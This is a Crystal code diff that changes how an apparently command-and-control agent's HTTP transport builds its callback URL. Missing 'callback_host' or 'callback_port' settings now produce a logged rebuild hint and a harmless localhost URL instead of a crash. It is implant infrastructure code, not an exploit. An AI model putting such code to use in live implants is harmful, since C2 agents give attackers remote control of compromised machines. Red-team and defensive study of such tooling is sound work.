@@ -126,10 +126,25 @@ module Dark::Agent::Transport
 
     # Implementation of build_full_url required by Base class
     #
-    # Builds the full URL for C2 communication from profile settings
+    # Builds the full URL for C2 communication from profile settings.
+    # Keys are read non-fatally on purpose. This runs during the very first
+    # checkin, and in this build an unrescued KeyError aborts the process: the
+    # unwinder faults before the rescue in send_checkin can run, so a config
+    # mismatch surfaces as "invalid memory access (signal 11)" instead of a
+    # useful message. Log the real cause and return an unusable URL so the
+    # caller fails with an ordinary connection error.
     protected def build_full_url(path : String) : String
-      host = @config.c2_profile["callback_host"].to_s
-      port = @config.c2_profile["callback_port"].to_s
+      c2_profile = @config.c2_profile
+
+      unless host_value = c2_profile["callback_host"]?
+        log_error("C2 profile has no 'callback_host'. The standard HTTP transport was compiled against an httpx config, which means the payload was most likely built without -D httpx_profile. Rebuild with the correct profile type.")
+        # Deliberately unusable, but syntactically valid so URI.parse succeeds
+        # and the caller reports an ordinary connection error instead of dying.
+        return "http://127.0.0.1:1/#{path}"
+      end
+
+      host = host_value.to_s
+      port = c2_profile["callback_port"]?.try(&.to_s) || "80"
       "#{host}:#{port}/#{path}"
     end
   end
